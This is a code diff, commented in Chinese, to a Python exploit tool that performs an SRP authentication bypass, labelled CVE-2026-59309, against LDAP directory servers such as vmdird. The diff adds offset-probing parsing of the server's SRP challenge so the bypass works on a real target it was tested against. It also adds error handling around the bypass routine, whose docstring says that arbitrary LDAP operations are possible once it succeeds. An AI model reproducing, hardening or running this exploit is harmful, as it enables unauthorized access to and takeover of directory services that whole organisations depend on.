@@ -198,6 +198,41 @@ class SRPLayer:
         return self.dec.crypt(body) if self.conf else body
 
 
+def parse_server_challenge(creds):
+    """解析 step1 挑战 { 0x00 mpi(N) mpi(g) os(s) mpi(B) utf8(L) }。
+
+    srp.c 布局含前导 0x00（reuse 标志）；vmdird 加载的 Likewise libsrp
+    实测布局存在差异（真实目标 821B 挑战按固定布局解析会越界），因此按
+    候选偏移做带合理性约束的探测解析，全部字段通过校验才接受。
+    失败抛 ValueError（含前 32 字节 hex 供诊断）。
+    """
+    errs = []
+    for skip in (0, 1):
+        try:
+            u = SRPUnpack(creds)
+            u.o = skip
+            N = u.mpi()
+            g = u.mpi()
+            salt = u.os()
+            B = u.mpi()
+            L = u.s()
+            if not 64 <= N.bit_length() <= 8192:
+                raise ValueError("N 位数异常(%d)" % N.bit_length())
+            if g <= 1 or g >= N:
+                raise ValueError("g 异常(%d)" % g)
+            if not 0 < len(salt) <= 128:
+                raise ValueError("salt 长度异常(%d)" % len(salt))
+            if not 1 <= B.bit_length() <= N.bit_length():
+                raise ValueError("B 位数异常(%d)" % B.bit_length())
+            if len(creds) - u.o > 4:
+                raise ValueError("尾部多余 %d 字节" % (len(creds) - u.o))
+            return N, g, salt, B, L
+        except Exception as e:
+            errs.append("off=%d: %s" % (skip, e))
+    raise ValueError("SRP 挑战解析失败（%d B，头 32B: %s）：%s" %
+                     (len(creds), creds[:32].hex(), " | ".join(errs)))
+
+
 class BypassResult:
     def __init__(self, ok, msg, info=None):
         self.ok = ok
@@ -218,6 +253,13 @@ def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
     在已连接的 LDAPConn 上执行 CVE-2026-59309 SRP 认证绕过。
     成功后 conn.layer 就绪，可执行任意 LDAP 操作。
     """
+    try:
+        return _srp_bypass_bind(conn, identity, policy, log)
+    except (ValueError, struct.error, ConnectionError, OSError) as e:
+        return BypassResult(False, "协议错误: %s" % e)
+
+
+def _srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
     ident = identity.encode()
 
     # --- 步骤 1：{ utf8(U) utf8(I) utf8(sid) os(cn) } ---
@@ -234,11 +276,11 @@ def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
             return BypassResult(False,
                                 "SRP 第一步未获挑战 (code=%s diag=%s)" % (code, d))
 
-    # --- 解析 { 0x00 mpi(N) mpi(g) os(s) mpi(B) utf8(L) } ---
-    u = SRPUnpack(creds)
-    u.c()
-    N, g, salt, B = u.mpi(), u.mpi(), u.os(), u.mpi()
-    L_raw = u.s()                       # 服务端原文 bytes —— M1/M2 哈希必须用它
+    # --- 解析 { 0x00 mpi(N) mpi(g) os(s) mpi(B) utf8(L) }（偏移探测，兼容 vmdird）---
+    try:
+        N, g, salt, B, L_raw = parse_server_challenge(creds)
+    except ValueError as e:
+        return BypassResult(False, str(e))
     L = L_raw.decode("utf-8", "replace")
     so = parse_server_options(L)
     log("[*] 服务端 SRP 参数: N=%d bit, g=%d, salt=%d B" % (N.bit_length(), g, len(salt)))
